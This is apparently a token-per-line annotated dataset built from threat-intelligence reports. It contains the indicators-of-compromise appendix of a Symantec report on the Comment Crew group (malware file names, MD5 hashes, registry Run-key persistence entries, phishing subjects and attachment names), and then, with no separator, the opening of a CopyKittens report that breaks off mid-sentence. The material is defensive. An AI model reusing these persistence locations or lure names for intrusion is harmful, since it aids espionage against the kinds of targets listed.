comment
crew
attackers
.

Filenames
and
locations
:
rouj.exe

%TEMP%\AdobeARM.exe

%TEMP%\iTunesHelper.exe

%PROGRAMS%\Startup\AdobeRe.exe

%USERPROFILE%\Local
Settings\iexplore.exe

%USERAPPDATA%\Microsoft\wuauclt.exe

%PROGRAMS%\Startup\adobeup.exe

%TEMP%\AdobeUpdater.exe

NTLMSVC.DLL

%PROGRAMS%\Startup\adobe_sl.lnk

%TEMP%\runinfo.exe

File
version
Info
:

Product
:
SoundMAX
service
agent

Description
:
Microsoft
NTLM
Service
Holder

Product
&
Description
:
JpgAsp

File
MD5
hashes
:
00b61db083b07a64fb6072b42aa83dc1  B_hash
0136ab6d2e507d4e63990b196121d41c  B_hash
017c03ad61f89ee6597ead40cc552aef  B_hash
019cb1a6776f0e0d353814711e9e171b  B_hash
02043566d027445374a1f7f0fc35d495  B_hash
025dc68c8e06d6488e338dcc55b295eb  B_hash
026c1532db8125fbae0e6aa1f4033f42  B_hash
02c9a3c3efd52e43dbf53e0995a7a24e  B_hash
051caf12c36662d946fd0146cd199db5  B_hash
05269f5236bd89b66f6f4694abef6222  B_hash
05c63c450d4d2aeb23053a6b6f8275b0  B_hash
05df8d890eb18614a7d206b41453d306  B_hash
086e91fa95136ad1d814cac327543bf9  B_hash
08ac41ce00bf436a3dc23c4639d5f5ed  B_hash
0925fb0f4c06f8b2df86508745dbacb1  B_hash
09a6d5b54e8c48ed33189ebf80df750d  B_hash
09c0f3a3099b6b38ec36d001361edd98  B_hash
0a98bfa4bef1eb755c9c154963b69dc8  B_hash
0aa4e635a61038a621d9264e33b4bc3f  B_hash
0b33a683812124d99de45c8e84dc9013  B_hash
0b6755e61840378952d69630b5c23e41  B_hash
0c6f8665dd18d5e86124c7bfbf3207f0  B_hash
0cdfea216d117cc97845edb9becaa498  B_hash
0d335de3c082627cd0c5699aa6012b7d  B_hash

Page
6

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here
0f1dd1bef76967a6b06a5e0432ca947b  B_hash
0f4432d54b28aafc976b5950d5337a5f  B_hash
1285ff3c3a4089b43c275220d0c54442  B_hash
1286c678b3a821dec8c8cc1125bd2bc0  B_hash
12c64a64ae32fd3dff75347dde2aafac  B_hash
13eb87290affe1360834037d9d400b39  B_hash
1475f178b6a86d3922b3e2c6fc59512d  B_hash
14d17aaa3016a618a3ede92511fdd339  B_hash
16710c96d5ee6554bae6b881d9e136bd  B_hash
17173efe0062114d2f993c7584520c1a  B_hash
18575542dc4e9aa5aa8eeda14c26e46a  B_hash
18a3bf5d8336f075ba503622880b5025  B_hash
19bc509f31f33a8f473ef9d671c1828b  B_hash
1b517ea2aae0ed0a71f6e74e34e860e1  B_hash
1bc363e4ad9fc3be4953dd3eaa2bdb76  B_hash
1d1e2c7bb5a9fa546a6b0ae3c308db61  B_hash
1d69504a3d3ac32275fa4df8af25d1f7  B_hash
1ee30f7ecaf25af38cf684ca56b75cf2  B_hash
1f9cf9f1b5738198674a58a378b0d7e1  B_hash
218bbd007898e6b6fc754fe5c76668fc  B_hash
21ed762e867cdabbb194aba878530c88  B_hash
22e10cbe46f406f5f1be0d613db4c2c3  B_hash
241e8465fd4d99a3f446d7f75957522b  B_hash
24be0dd53bb43bb6cd08044b21a6aaaa  B_hash
2500494616f4e7e1fa14fb3a46f468a7  B_hash
255b1aaff69668ac19906219d36c607c  B_hash
271dad1471efd9bfc1a9dc05d6c30a24  B_hash
27fb01f7b3137921126ba086da4e6a2c  B_hash
280531bb85998ff3dc7eb8d057525ffe  B_hash
2997ec540932ea6b1fe0cab555b939d8  B_hash
299ca1f787d2340d34407ef084845260  B_hash
2a3aca1b002c6894c5edcc5e25a8f970  B_hash
2b3faf2856c220aa8b87632ac8bbd1a5  B_hash
2c4cabb4ca19ddf87c7f11bad44bdf05  B_hash
2cf5b5a9333d159b664725811465d1a3  B_hash
2d0318507bc4c1958913b31009de37f8  B_hash
2dbbadc147f11f2a856a648cdc332c0e  B_hash
2e7a8e7e9d8d62c94d011e86de9cb12a  B_hash
2f37912e7cb6e5c478e6dc3d0e381a24  B_hash
2f6c8da1c5f397bea7b300d28b3ad4ba  B_hash
2f7918548b0aa59f23a1c16aa98e058b  B_hash
30e81a30471c8f63b4688533252b56fa  B_hash
320b4bd876004c1f0455f6f48b07e164  B_hash
32e474b21555d3946970c73648d88b36  B_hash
33a03ca462cec85e33dba0a1dcb9aee0  B_hash
356e11813fed7623a77610e836bcab65  B_hash
3599a78c7e99b451c00d3490f17f842f  B_hash
35ae79bbe9f560b9634ce28b6569bd0f  B_hash
35ed31733fbd7eeb4bfcc29e28a8496f  B_hash
36ca00585d13d6911f086f0d2d496f96  B_hash
370947e6c802d21a732ac0cc024c4fcf  B_hash
37b1e5809dd5a92a1d73f0e36af6791e  B_hash
399c41047abd99b6e86d04b7dd444509  B_hash
3b266b165468b810cd456cdf88ca8619  B_hash
3b6a1f6ad4b8141b1aed8644d789706f  B_hash

Page
7

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here
3b8ada8eda04f204164449a0fec0c296  B_hash
3b9cc9e174ad19380efef2744b7ff046  B_hash
3c058ca758f97cd2ae56df8a08f6a5a3  B_hash
3c9aa6dc8c4501ffa2798f044df53438  B_hash
3ce55c6994101faec00b5b7c2fee494f  B_hash
3d41375ee362f4265ea2e90b9a08f0dd  B_hash
3f637c1477442d92962be4ed427bb1cd  B_hash
3f9e63ee4ae254778c69369fedf0d999  B_hash
3fb6039a572369d8d23fb99987ea21a9  B_hash
3fc2aa493492e6d7560ac8a5d69d7cbd  B_hash
3fecd601404abda8f793ff5cc7ecf973  B_hash
41998b32ab11e474b167edf9dbb59b12  B_hash
4248d33b4273a80d11d6b3b6297851eb  B_hash
4287353240e4e473e940a9289a48a333  B_hash
42acd0ed699d94602a0494f65a328615  B_hash
431f635eb68b936182d73bf6db06fc97  B_hash
43e128cfd0080a644e4ce98f84e29e8e  B_hash
43f3a0a82397400a181c080992d35a5b  B_hash
4602735e4a8754ff7f5a8785f9fd336a  B_hash
467b90773754e35e1535a164140be005  B_hash
46b3b305530fb68f7a88b8453e4866ea  B_hash
4890bf4c2d68657969e1cd11e0ae2648  B_hash
4899aa64923115886dd7cff5fff5ea1c  B_hash
491db327f479a1a34898229811fa8a5d  B_hash
49cc5f649e9098530ceeb2ea45346a9d  B_hash
4b03db464b22536f700c99c3bd36e9e2  B_hash
4c136f1fbd9d7010369ae5644a8af4b0  B_hash
4cd5a29a7fc904aaaccbca9e30e0a865  B_hash
4cdfb56105b07f463d046fb425567cb0  B_hash
4ce22cee6abcb37db757e3fd60970090  B_hash
4dc2bcad31fb36f0913e441deeda8121  B_hash
4e5ed120295d9937de106fc703e64732  B_hash
4f13bd1db43e54d2cd2427a87ddb8e22  B_hash
507fa8a735417219d6b881834f660cb2  B_hash
5084ddfb90791516015c02c68d58fe5d  B_hash
5106b19a9a29f0228782e0cafcd1cc2e  B_hash
516c2981f3506ede7608ef2f273c6aed  B_hash
534b3650b350b503e0f0f3bb6dd7598c  B_hash
53d1e354104d5fc028d83aa519c1d1c6  B_hash
551aa0ab2b40fa7d891664caf0da879b  B_hash
5621ed9c3b844654141c1a5ea7ca8c0d  B_hash
578dbadaa5086e24d576328b7d4fedba  B_hash
57bc1531a12179c5794d5c99b8442eba  B_hash
582207d1f939f80bacc36a7790f40dc8  B_hash
582e827a539b6243f1c90b720fc143a4  B_hash
5aea3a20553a07fa50c4e815cf9ba7ff  B_hash
5afdb5db234a1a13f5449be25f114999  B_hash
5ba8c4ef080e61310943fcb3c68bf002  B_hash
5bdb1b2313541f4cdc967391a4d150f4  B_hash
5c43e4ac0a6ad74844b2a310f1abc1c7  B_hash
5ca21c7986db58d44306e94f1ea6ae5c  B_hash
5d1d18c697eefb03e120d9ef3f53dd28  B_hash
5e8d1334238dfaf5f11d7f2186989095  B_hash
5fee0adbac53eee82626daa5c5f99aba  B_hash
607b46c73adb9a8bf03f5cd038871347  B_hash

Page
8

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here
628e4933864d3f712670658a93d11113  B_hash
62ccc75782d657850b85456ab48f2277  B_hash
633d92d13c2e8330cb4a3bc5130ab84f  B_hash
640a64136516298ca80490d75a365695  B_hash
640fbb5f8938ea45204de6496240f82a  B_hash
6414217bafb6f4c058773b0134e56e99  B_hash
64b865afdc34091a9c02700adeea5853  B_hash
655d1322795ed9532390ccf2e8f726f8  B_hash
659300af2f7c9e76f55464b21784a7f6  B_hash
659fb07c70034571de7a1b4b5ac86b01  B_hash
66060b82f299c14e18b65d21d277a49e  B_hash
668731574fa9ad7567fb4854805a3fb2  B_hash
66e4538702381035dc62247080d4593f  B_hash
6757128a636e2c509861d4f75ff128f1  B_hash
67a8b964857fe499b62442308a767e94  B_hash
6827e494a230a1483e19c205c532df17  B_hash
685e10f1393eaee470224b7fe1359202  B_hash
688ba2b3739ad54dee4139a727e457cc  B_hash
6981364b6f1142363c151b11da66cc98  B_hash
6993ed604acd3e17a7bafcfdc2b27898  B_hash
6a0280f169d233a0bdc81ee6a70ef817  B_hash
6b8585ffbdf90c9b120ac1a79fa4dc51  B_hash
6bc6bacbbbacf369fea145d9044bd863  B_hash
6c5b2712a66db42b960aef5b87590033  B_hash
6e67fc27a49769f5218824d405d8fce5  B_hash
6f1c70d77e2571fe8a402aa1a8b7e8cd  B_hash
6fd6aa2a4038903ed6d8e5771689f7c1  B_hash
700941e4fa44941b18844c9bfb3474dc  B_hash
70320b5c719c70c860a55cec7ef173e8  B_hash
709d6eff31854fad212f83a91a900920  B_hash
70fef3c8073e97980b60b4ad8388ab5d  B_hash
716978305d76e1e458c480d80f24caca  B_hash
718179479dd9bd93beae66665e452c87  B_hash
718fcf2a80348110f519a000854e9e0e  B_hash
71de04a952f8c09243c15a7fa5371073  B_hash
71fd3ea6c3e7e2f1eba9d7e911b1cffe  B_hash
7228ac8f341f6ecaff45c8163f421f14  B_hash
76000c77ea9a214f5b2ae8cc387809db  B_hash
7715864443576c824cdc9f39ffacd9dc  B_hash
7b81fa4334cf0e520269f5484fef9fca  B_hash
7bcdd0e5996e849d1068fcffdec81371  B_hash
7bee4b7d948433a58b18d2189d480a29  B_hash
7cd15bb31ff889e81f370d0535e02493  B_hash
7d00ea1262125b2b0469dd639b810823  B_hash
7d101cc3b87ac51c0c1ca8a4371bc84a  B_hash
7d21e2b1b293f4176ba1d8abc2460328  B_hash
7e75928b5ce3dd41c9b9b1e67cff16d6  B_hash
7f7cc1a8d7a6bbe6a52c94bb7f41f727  B_hash
7f90942ace185ca1ba5610f6eddf3376  B_hash
8027234685f88f3b74c45b245c841843  B_hash
802a3965e42e75cc3dcd5f5523929859  B_hash
80ba5a336a4044c1406774d56e130e7e  B_hash
80c58de2dbd1571228b538c9556cd29d  B_hash
824bee27f10d5c81879657c8a2af9f0c  B_hash
82c598abdf848c6fef03c63f5cf7feaf  B_hash

Page
9

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here
834a274599aed64959b3b2bfe931af4c  B_hash
83cdbc9aa1907d55dda3e28149e897cc  B_hash
83d45d80682afa9b2526029b2bc2fb33  B_hash
850ac92dfa39f2391addc2d888c62ef8  B_hash
8548dd501aaf132b134aa3849e15d2aa  B_hash
85873c12599490a0f7db691b0c5179ae  B_hash
860d5840c3b1a750d8c4e6bc68ecfbab  B_hash
867d80bc1c369ca7ee429c727d2c5fea  B_hash
875cb4844bc03f6da7a60553632c7678  B_hash
888eadff6982de01c60891ce185473b7  B_hash
88c0e5a4ca408ac12acaaf7a9ef9eb49  B_hash
894ef915af830f38499d498342fdd8db  B_hash
8a413af90665ca7909bcdcf19cd566ed  B_hash
8ac64b904c188ef6b73dbc5073cee1a9  B_hash
8b69f0a948c32288f3fab4ed2845cb1b  B_hash
8ba366ef5ecd802c82289dcea22b2146  B_hash
8c148fe80ae705af284b92f1c283013a  B_hash
8c3a791ce682e3c5da5bcfbce261eeaa  B_hash
8c76de0a8ac79536b96619613960681c  B_hash
8d3a6b78118b647a7f31f06a46c27fd4  B_hash
8dc7eb49fe1fbf490f90c153a71c60a5  B_hash
8e2e709c01ccb286c51ac9e592eea48a  B_hash
8e53ad954f05d2c3f57b19b1ecb0fea0  B_hash
8f8e948a2f9afd7ece6dc6603cfbd56a  B_hash
8fbbf38c053dbb0da3dd2fd6af4869d2  B_hash
905d5cd372fb22dd5f9804adb2d2787b  B_hash
9157d078effa4b727180c40bedb74ef6  B_hash
920dffe40787f1f3fdb24548b4a210db  B_hash
92785f445f366ed548388b1af6b01f9c  B_hash
9327f1eefb18fde7f622fc2efbbbdb4b  B_hash
939e07685fec28a15f88786b097bb14b  B_hash
9400950fa381ba1750c914fa9e6fd85e  B_hash
942b1ca8c3c64be1e4c40e26c9e39ad8  B_hash
962c52436706b5c226894de0436b860e  B_hash
96ee5acbe155f37ff1604b4fd259e55f  B_hash
96f31d6fda587b43887e846876e5c399  B_hash
975c718bf93ca5d0693bb0d4c7e42d1e  B_hash
99b58e416c5e8e0bcdcd39ba417a08ed  B_hash
9a58902740c5b73eb6a68a126ac6ac55  B_hash
9a847c1f54359ffd3c335e97600f6f5d  B_hash
9aca099f7cd3b3b29551b67af48467d1  B_hash
9be590614e2407dc144ad6c100a2873a  B_hash
9bf4683c09a2d60294ff79ce026f4e64  B_hash
9cc15358d6ce18150dbee6be3281151d  B_hash
9cd1e3b67540bdc2fc4a3835e170bc65  B_hash
9e6b8b265f05302eca455ce8ea10a3aa  B_hash
9fcb233ee18df6c19b1ad3922dd41a2a  B_hash
9fd0e94fce1543b75b44414a61b252b0  B_hash
a01ea69e4c10721ec088676cef67d8bd  B_hash
a19e68e72084d867a39776faaa6f5fce  B_hash
a1fa946523928c16340cf40daa2ffb53  B_hash
a26a85c33ddf57d720040629931be174  B_hash
a4847e655c817e3c5112e888a2877f4d  B_hash
a4d476fb7b084bd01a847ab7e0d839b5  B_hash
a55f6c8b795ccdc469b9b67b22ddc88b  B_hash

Page
10

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here
a637ea307380ba21a355c3cffd37639a  B_hash
a6cba31fcca49ff9ed6fd9894644de9e  B_hash
a76f0fada1602e9c119cba24306442b4  B_hash
a98d2c90b9494fc885c7cd35d43666ea  B_hash
a9c20499d43f9674cc37dbfa81381203  B_hash
a9d2caa6ebbfd5be071748e59e754cf4  B_hash
a9e0a604e5b8ed5f4f286c3355d7a0fb  B_hash
aaa01f776acabdf9f07ea3eaff1695d6  B_hash
ac2b219ede57f9d14cdce38e987862aa  B_hash
ac9e0b2af215821f7223b6eaeaea03db  B_hash
ad95f613fc4b644bd5e3230eb0b5dbcc  B_hash
adb97252b05a6e82697bf93c347bdf25  B_hash
aea5dc22e706c836d056f4ba1f13dea3  B_hash
af285fa9a141f422b8ccbfb4e9a00054  B_hash
b18cabead7248e8156230c71399b79c9  B_hash
b19ef1134f54b4021f99cc45ae1bc270  B_hash
b1c540b4b9c8a87a1e87a76ed289f18d  B_hash
b2784e4dc6e602d9d6bf09325bba8c4e  B_hash
b29556856203049b9e7b05e01f5ae73f  B_hash
b3056919871fc01a1ed3294e2014e0c4  B_hash
b41c02eb41070e0a2e459abf2fc39b69  B_hash
b44cd1fa5d8beb08519bbe0c1d796b0f  B_hash
b457372a87597b746ce69e05c4a7d3fa  B_hash
b653012d2bfa4e3419d97eb9f2e5ed4a  B_hash
b665ea35f8f7954657eed1e54517843d  B_hash
b68eadb2a8069c7e88535e1ebfb4be0a  B_hash
b8c83b3549ebb24b3e00dd23c2aa050a  B_hash
b8f77674d292d205f8f5cf6c3f3c34df  B_hash
b8fdf06f78341581870477574e2b08c3  B_hash
b921e0d11127af9613804c63cddd86ca  B_hash
b9367aba4f267b82a838223df016bd6b  B_hash
b96b79f4f1b4306ac2c63fc988305fb0  B_hash
ba700e3a83fec3cc984e1fb572aa0add  B_hash
bbb4bdd1d7e8589d145163f1efd458f5  B_hash
bbbf285e8344f7df330f93c7c3baf27f  B_hash
bbccf8643368c80dd083fb92d67d00be  B_hash
bbdce1e1991f292d366097a743da3724  B_hash
bcc6addece28265390b2d535d65c49b8  B_hash
bd6481ed6dfe67ba9f2f8f26e2cee722  B_hash
bdf512d5eef853d07c0db345345e3db7  B_hash
be3799da210edb81143d609e66e5b7ff  B_hash
be54e3660bf928b8b5f764f5cdfdc4da  B_hash
bf18ef997b7d589f031f47799a33f27b  B_hash
bf65727accaa53d65c31ed5b582053c5  B_hash
bf778439895829ff986207900bfcfe02  B_hash
c1438390098e4dc7bb8b52efcf1d2465  B_hash
c1919e6f2e05feb9dc9b6ab9f81dcb2f  B_hash
c243a7c1cf23b91f73100bb9e947439e  B_hash
c32696b255bac4b849fc249e56944a91  B_hash
c376aecf43bf021b6408ca99cd31da01  B_hash
c5062bbbb15911a63de77a66773874d9  B_hash
c63cc0a8b0b3a70f7b835a3fff9f02a5  B_hash
c8607553e37cc1fc870572670c1910f5  B_hash
c89d4d40e4b68a9952121b62b0dda920  B_hash
c9570396c897e02ec8aa195c6241f945  B_hash

Page
11

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here
c9a32616f89dc953486bd1b5d83359ec  B_hash
c9b4c4d65298dc10be6784d0f0ad8519  B_hash
c9f19071bac9d4eb3b08b4017c0d9c4d  B_hash
cac3bc3039cd73935051ad8df2e53d34  B_hash
cb40ff3b3ed8c1966defbe1dafdd1326  B_hash
cca75af9786d7364866f40b80dddcc5c  B_hash
cd5f3dbea197dc5afb673e42f0e9c3fe  B_hash
cdc0c4fdc649dec017ace0f2898068d0  B_hash
cec766518fa5b607157e92e9c24c0d03  B_hash
cf5356cdf42d264d5213cce4cd415f0b  B_hash
cf96139290c09963a32506cd85825ed3  B_hash
d3174652816010a7f6d8f4523ee3a077  B_hash
d4036f03c760084cc677edf4ee6c4a39  B_hash
d46d261ec92daf703cd584f10037198c  B_hash
d5027d35c8bd9e867113bd4a1edb931f  B_hash
d58323fb222b9ff681c0982ba286a296  B_hash
d6b1989d9c271b8575326e4fca159ae8  B_hash
d6b198eda724e2b3367502a6a2232939  B_hash
d6b467c92256094f720e9fc75f149737  B_hash
d6d5aeb79899485f5734bf8847782266  B_hash
d6e98d062d7900c6fe9a6d7f0b1d7fec  B_hash
d6ff4333eb1a2305d5b6cf4705213393  B_hash
d795292ea23217480ad92939daf6dd22  B_hash
d83055efe66377067ce99d99c706f19a  B_hash
d8f7aaad3677fac1cde911c7362c2b69  B_hash
d910d21bd54b63ef61b3f250fe73dcc6  B_hash
da451674bb68804b390bd7413691c91e  B_hash
dab17bcceae6f32eae5d800d0d3f9e46  B_hash
db6ae6da64f14168b3624e26191277cf  B_hash
db7d3724e5f004168a1a56f6b9de3cd5  B_hash
dd5aad5d66bc96e5ac60cbe5d132c2ec  B_hash
de5eeb9847a5fbc1a6cbb4cfb8bb6aa0  B_hash
df53ce3797932d9e62ceaa760a3f0e3e  B_hash
dfaa6250dc947602d5dc200e503f23a5  B_hash
dff3a274e5fa35013601c7985bf13d56  B_hash
dff7ac111e48115e208c2649b94b1115  B_hash
e0b3a0fd042ff50e0de22725864775b8  B_hash
e1117ec1ea73b6da7f2c051464ad9197  B_hash
e2494eba419891c0c101af74eb8c029c  B_hash
e2620e1cf89830e8de1e8c4530829a15  B_hash
e27f0975fd3278e7303102783767c508  B_hash
e2a557b39231ee91724c150e3ec4b493  B_hash
e2be37df12f7b98b2b73197d77773263  B_hash
e4255f51a871a95baa10b6b2c4ed2470  B_hash
e62bb947d72d12311890f2e07eb6ac8b  B_hash
e6446d52e9f4b5c2c5a9ac850281cae8  B_hash
e649b8b9e541406446da47d8d0a91385  B_hash
e6ffb1c6e1508f474a69f091435454ce  B_hash
e85863b1de035814b4b01a2b6c477dd1  B_hash
e90b037f1cbc79796fd8b1f6382c8483  B_hash
e93a4f4872bf6cd8c3f0eed6017a8d41  B_hash
ea823850b777993d636e4a565568f734  B_hash
ead35eab94820d5a34f185d0b26b7930  B_hash
ebe291e968eb5a86b4963d27352bc525  B_hash
eced29c71867e375aed0da408d6b07f4  B_hash


Page
12

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here
ed665cf8a48f08f8b4fed8bbf9d2d998  B_hash
ee998128e20971ca4296a8a73ed79f43  B_hash
eea7ae4eb726c3e05f187110090adb18  B_hash
ef10f4f11032d48f7e82c0a788c0f489  B_hash
efaadcfa4271c50927ab817e0c4a0bc3  B_hash
f0a00cfd891059b70af96b807e9f9ab8  B_hash
f15cff24d8a3a9ffce590cc8e69baec9  B_hash
f1c4b919fdf008a8400189562f5e2fba  B_hash
f29cb80bde4af21c226596e9d125795d  B_hash
f2f2cad79dcfb356db7b2485c7a27f03  B_hash
f643fa851203e9159c9dc50e4ab8d81e  B_hash
f74ec871c77e4b5e5b2ae0917b1f0f21  B_hash
f7820d429d3185ad00e6758c343e29ce  B_hash
f82d3b270b16780044817978f4f3fe1a  B_hash
f9d2c3e8f81b9c44a1837478b2a98e5e  B_hash
fb0b900de6d286321fd6d20c6c4f5679  B_hash
fbb0c14cacc60fdd393fb5889d5a0b57  B_hash
fc97b89541b149e0dd9937ba876b3ee1  B_hash
fd130b2bce93caf18bc23f1526daae99  B_hash
fd31f952637370a30d74c2a65ba8d2cd  B_hash
fd9b5c35c042a6c462187067fb869aac  B_hash
fde5e109bfab33964564f387f8940030  B_hash
fe568a370aa3d2c78125ab37c16484d1  B_hash

Page
13

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here

System
indicators

System
based
indications
of
possible
compromise
by
the
comment
crew
attackers
.

Registry
entries
:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'Acroread
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'Adobe
Update
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'AdobeCheck
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'AdobeCom
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'IMSCMig
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'McUpdate
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'Register
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'SysTray
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'systemupdate
'

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'wininstaller
'

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'APVSVC
'

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'AdobeUpdate
'

Service
names
:
elpmasym

Net
CLR


Page
14

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here

Email
indicators

Email
based
indications
of
possible
compromise
by
the
comment
crew
attackers
.

Subject
lines

Capt
[REMOVED]
update

Fw
:
LES
Request

Libya
crisis

Five
Simple
Questions
for
Democrats
on
Spending
Cuts

Behind
the
Easing
of
Israeli-Palestinian
Tensions

Business
Exec
Urges
Broad
Trade
Agenda
To
Curb
China
Role
In
Latin
America

President
Chavezs
Comments
About
President
Obama
and
the
United
States
on
Sundays
'
Alo,Presidente
'

FW
:
New
Standdard
Operational
Procedures
(
SOPs
)
between
the

AGENDA
[REMOVED]
Help
You
Save
Enough
for
Retirement

Spreading
Civil
Unrest
in
the
Middle
East
and
North
Africa

The
latest
analysis
on
Syria

International
Atomic
Energy
Agency
invite
you
to
attend
Atomic
Energy
Summit

GAC
Monthly
Report

Emergency
notification

Human
right
of
north
Afica
under
war

Meeting
information
of
[REMOVED]

Meeting
information
of
[REMOVED]

Meeting
notice
from
[REMOVED]

Meeting
notice
from
[REMOVED]

FY12
Government
Opportunities

Yemen
para
for
SC
briefing

Fighting
Protectionism
and
Promoting
Trade
and
Investment

Weekly
Security
Report

New
Update
of
Health
&
Medical
force

Nuclear
Security
and
Summit
Diplomacy

Agenda
of
[REMOVED]
Visit
in
July
2011

Agenda
of
[REMOVED]
Visit
in
July
2011

Obituary
Notice

Updated
Roster
20110712
2011
project
budget
[REMOVED]
National
Security
Seminar

Current
internatinal
situation
surrounding
Syria

FW:How
to
Get
Free
Airline
Tickets

Fw
:
[REMOVED]
Defence
&
Security
Industry
Mission
to
[REMOVED]
201
[REMOVED]
heriketlik
pilani
2012
Global
aerospace
and
defense
industry
outlook

Email
attachment
names
update.exe

CTF
2011
(
MF).xls

BBC
Monitoring
reports..xls

Page
15

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here

Five
Simple
Questions
for
Democrats
on
Spending
Cuts.doc

Behind
the
Easing
of
Israeli-Palestinian
Tensions.doc

Business
Exec
Urges
Broad
Trade
AgendaTo
Curb
China
Role
In
Latin
America.doc

PatriotLMSR2009Fin
.doc
agenda201005.pdf

Protests
Spread
in
Syria.pdf

Cybersecurity
and
Cyber
War.pdf

The
Meeting
intivation
of
International
Atomic
Energy
Agency
06-05-2011.scr

New
SOPs
for
HEC
Coord
with
NATO.pdf

Human
right
report
of
noth
Afica
under
the
war.scr

Middle_East_Civil_Unrest.pdf

meeting
invitation
of
British
Council
2011.scr

Meeting
information
details
of
[REMOVED].exe

Meeting
information
details
of
[REMOVED].exe

Meeting
detail
information
from
[REMOVED].scr

Meeting
detail
information
from
[REMOVED].scr

weekly_security_report-06-20-2011__-__06-26-2011.pdf

How
to
Get
Free
Airline
Tickets.pdf
2011.xls

Obituary.xls

Updated_roster.xls
2011
project
budget.xls

Participant_Contacts.xls

Current
international
situation
surrounding
Syria.doc

Update
of
Health
&
Medical
force.xls

FY12
Government
Opportunities.pdf

China's
Jasmine
protests.pdf

Yemen
para
for
SC
briefing.doc

DECLARATION-
COMMENTS.Netherlands.pdf

REPLY_
FORM.doc

Global
A&D
outlook
2012.pdf

Global_A&D_outlook_2012.pdf

Page
16

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here

References

Mandiant
Indicators
of
Compromise
http://intelreport.mandiant.com/Mandiant_APT1_Report_Appendix.zip

Page
17

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here

About
Symantec

Symantec
protects
the
world's
information
and
is
the
global
leader
in
security
,
backup
,
and
availability
solutions
.

Our
innovative
products
and
services
protect
people
and
information
in
any
environment—from
the
smallest
mobile
device
to
the
enterprise
data
center
to
cloud-based
systems
.

Our
industry-leading
expertise
in
protecting
data
,
identities
,
and
interactions
gives
our
customers
confidence
in
a
connected
world
.

More
information
is
available
at
www.symantec.com
or
by
connecting
with
Symantec
at
go.symantec.com/socialmedia

Headquartered
in
Mountain
View
,
Calif
.

,
Symantec
has
operations
in
40
countries
.
More
information
is
available
at
www.symantec.com

For
specific
country
offices
and
contact
numbers
,
please
visit
our
website
.

Symantec
World
Headquarters
350
Ellis
St
.

Mountain
View
,
CA
94043
USA
+1
(
650
)
527-8000
1
(
800
)
721-3934
www.symantec.com  B_url.normal

Any
technical
information
that
is
made
available
by
Symantec
Corporation
is
the
copyrighted
work
of
Symantec
Corporation
and
is
owned
by
Symantec
Corporation
.

NO
WARRANTY
.

The
technical
information
is
being
delivered
to
you
as
is
and
Symantec

Corporation
makes
no
warranty
as
to
its
accuracy
or
use
.

Any
use
of
the
technical
documentation
or
the
information
contained
herein
is
at
the
risk
of
the
user
.

Documentation
may
include
technical
or
other
inaccuracies
or
typographical
errors
.

Symantec
reserves
the
right
to
make
changes
without
prior
notice
.

Copyright
©
2013
Symantec
Corporation
.
All
rights
reserved
.

Symantec
,
the
Symantec
Logo
,
and
the
Checkmark
Logo
are
trademarks
or
registered
trademarks
of
Symantec
Corporation
or
its
affiliates
in
the
U.S.
and
other
countries
.

Other
names
may
be
trademarks
of
their
respective
owners

Page
18
CopyKittens B_malware.backdoor
Attack  I
Group

Version
1.0
–
23/11/2015

All
Rights
Reserved
To
Minerva
Labs
LTD
and
ClearSky
Cyber
Security
,
2015

Contents

Executive
Summary
.........................................................................................................................
3

The
Group
Attack
Cycle
...................................................................................................................
4

Step
One
–
Spear  B_malware.backdoor
Phishing  I
...........................................................................................................
4

Step
Two
-
Droppers  B_malware.unknown
Matryoshka  I
................................................................................................
6

Dropper
–
SCR
PE
File
..............................................................................................................
6

Step
Three
-
Reflective
Loader
....................................................................................................
8

Step
Four
-
RAT
Component
......................................................................................................
10

Runtime
API
Address
Resolution
...........................................................................................
10

Installation
and
Persistence
..................................................................................................
10

DNS
Command
&
Control
......................................................................................................
11

Common
RAT
Capabilities
.........................................................................................................
13

Improvement
Over
Time
...........................................................................................................
15

About
Us
....................................................................................................................................
16

Minerva
Labs
.........................................................................................................................
16

ClearSky
Cyber
Security
.........................................................................................................
16

Appendix
A
–
Spear B_malware.backdoor
Phishing  I
Examples
.........................................................................................
17

Appendix
B
–
Indicators
of
Compromise
.......................................................................................
20

Executive
Summary

The
Middle
East
has
been
a
cyber
warfare
hotspot
for
almost
a
decade
now
,
a
theatre
for
some
of
the
most
advanced
threats
the
world
has
ever
witnessed
.

In
between
those
highly
advanced
attacks
,
more
and
more
attackers
possessing
only
a
basic
set
of
skills
started
to
pop
up
–
spreading
well
known
RATs  B_malware.backdoor
,
obfuscated
with
generic
publicly-available
packers
.

This
report
focuses
on
the
CopyKittens B_malware.backdoor
,
a
mid-level
group
.

The
CopyKittens B_malware.backdoor
attacks
are
effective
and
advanced
in
a
few
ways
:

Infecting
of
computers
is
performed
in
multi-stage
,
stealthy
method

Data
exfiltration
is
performed
over
DNS
protocol

They
avoid
using
known
RATs  B_malware.backdoor
and
packers B_malware.backdoor
,
tools
are
'
homemade
'

Constant
development
is
performed
to
overcome
security
products
improvements

Yet
,
this
group
is
clearly
not
made
up
of
dozens
of
high-end
computer
and
security
experts
.
The

